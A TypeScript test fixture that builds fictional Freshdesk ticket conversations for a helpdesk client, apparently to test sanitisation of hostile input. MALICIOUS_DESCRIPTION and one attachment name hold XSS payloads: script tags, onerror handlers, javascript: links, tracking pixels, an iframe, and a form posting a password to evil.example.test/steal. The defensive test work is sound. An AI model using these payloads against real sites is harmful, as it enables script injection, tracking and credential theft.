/**
 * Recorded-shape Freshdesk API v2 conversation payloads for the alpha fixture
 * helpdesk: GET /api/v2/tickets/:id (with description) and
 * GET /api/v2/tickets/:id/conversations.
 *
 * Fictional throughout. Conversation `source`: 0 reply, 2 note, 9 phone
 * (Freshdesk's fixed API values). The automated reply carries
 * `automation_id` / `automation_type_id`, the markers Freshdesk puts on
 * conversations an automation rule wrote; it still needs confirming against
 * the owner's helpdesk.
 */
import { ALPHA_HOST } from "./freshdeskFixtures";
import {
  COLLEAGUE_ID,
  FIXTURE_NOW,
  ME_ID,
  alphaTenantWithTickets,
  fixtureTickets,
} from "./freshdeskTicketFixtures";
import type { FixtureConversation, FreshdeskFixtureTenant } from "./freshdeskFixtures";

export const HOUR = 3_600_000;
const iso = (msAgo: number) => new Date(FIXTURE_NOW - msAgo).toISOString().replace(/\.\d{3}Z$/, "Z");

const ADA = 5000000001;
const BO = 5000000002;
/** An author ID that is not one of the helpdesk's agents (a bot or a deleted agent) */
export const UNKNOWN_AUTHOR_ID = 9000000099;

let nextId = 7000000001;
function conversation(
  ticketId: number,
  msAgo: number,
  fields: Partial<FixtureConversation> & Pick<FixtureConversation, "body" | "user_id">,
): FixtureConversation {
  const at = iso(msAgo);
  return {
    id: nextId++,
    body_text: fields.body.replace(/<[^>]+>/g, ""),
    incoming: false,
    private: false,
    source: 0,
    ticket_id: ticketId,
    support_email: null,
    from_email: null,
    to_emails: [],
    cc_emails: [],
    bcc_emails: [],
    attachments: [],
    automation_id: null,
    automation_type_id: null,
    created_at: at,
    updated_at: at,
    ...fields,
  };
}

/** Original request of 1001, with everything a hostile sender might try. */
export const MALICIOUS_DESCRIPTION = [
  "<p>I cannot sign in since this morning.</p>",
  "<script>window.__pwned = true</script>",
  '<img src="https://tracker.example.test/open.gif" onerror="window.__pwned = true">',
  '<img src="//tracker.example.test/relative.gif">',
  '<div style="background-image: url(https://tracker.example.test/bg.png)">styled</div>',
  '<a href="javascript:window.__pwned=true">click me</a>',
  '<iframe src="https://evil.example.test/frame"></iframe>',
  '<link rel="stylesheet" href="https://evil.example.test/x.css">',
  '<form action="https://evil.example.test/steal"><input name="pw"></form>',
].join("\n");

/**
 * 1001 (A05): request, public reply by me, internal note by a colleague, then
 * the customer writes again. Last answered is the reply; the customer waits.
 */
const t1001 = [
  conversation(1001, 44 * HOUR, {
    user_id: ME_ID,
    body: "<p>Thanks Ada, I have reset your session. Please try again.</p>",
    attachments: [
      {
        id: 4000000001,
        name: '<img src=x onerror="window.__pwned=true">steps.pdf',
        content_type: "application/pdf",
        size: 48_213,
        attachment_url: "https://attachments.example.test/steps.pdf",
      },
    ],
  }),
  conversation(1001, 36 * HOUR, {
    user_id: COLLEAGUE_ID,
    private: true,
    source: 2,
    body: "<p>Internal: the SSO provider had an outage yesterday.</p>",
  }),
  conversation(1001, 26 * HOUR, {
    user_id: ADA,
    incoming: true,
    body: "<p>Still failing, same error.</p>",
  }),
];

/**
 * 1002: an automated acknowledgement, a public note, a logged phone call and
 * an internal note. None is an answer, so it is Never answered.
 */
const t1002 = [
  conversation(1002, 95 * HOUR, {
    user_id: COLLEAGUE_ID,
    automation_id: 31000000001,
    automation_type_id: 1,
    body: "<p>We received your request and will get back to you shortly.</p>",
  }),
  conversation(1002, 90 * HOUR, { user_id: ME_ID, source: 2, body: "<p>Public note: export queue is long today.</p>" }),
  conversation(1002, 85 * HOUR, { user_id: ME_ID, source: 9, body: "<p>Call with Bo, 4 minutes.</p>" }),
  conversation(1002, 80 * HOUR, { user_id: ME_ID, private: true, source: 2, body: "<p>Checked the export worker.</p>" }),
];

/** 1007: 103 entries, so its history spans two pages of 100 (A06). */
const t1007 = Array.from({ length: 103 }, (_, i) =>
  i % 2 === 0
    ? conversation(1007, (143 - i * 0.2) * HOUR, { user_id: ADA, incoming: true, body: `<p>Customer message ${i}</p>` })
    : conversation(1007, (143 - i * 0.2) * HOUR, { user_id: ME_ID, body: `<p>Reply ${i}</p>` }),
);

/** 1008: the customer wrote after a verified reply; the latest outbound reply's author is not a known agent, so Last answered is undecidable. */
const t1008 = [
  conversation(1008, 160 * HOUR, { user_id: ME_ID, body: "<p>Reply by a known agent.</p>" }),
  conversation(1008, 155 * HOUR, { user_id: 5000000001, incoming: true, body: "<p>Any news?</p>" }),
  conversation(1008, 150 * HOUR, { user_id: UNKNOWN_AUTHOR_ID, body: "<p>Reply from an author Velo cannot verify.</p>" }),
];

const DESCRIPTIONS: Record<number, string> = {
  1001: MALICIOUS_DESCRIPTION,
  1002: "<p>The export has been running for hours.</p>",
  1004: "<p>Please refund order 42.</p>",
};

/** Alpha helpdesk with tickets and their conversation history. */
export const alphaTenantWithHistory: FreshdeskFixtureTenant = {
  ...alphaTenantWithTickets,
  tickets: fixtureTickets.map((t) => {
    const description = DESCRIPTIONS[t.id] ?? `<p>${t.subject}</p>`;
    return { ...t, description, description_text: description.replace(/<[^>]+>/g, "") };
  }),
  conversations: { 1001: t1001, 1002: t1002, 1007: t1007, 1008: t1008 },
};

export { ALPHA_HOST, ADA, BO };
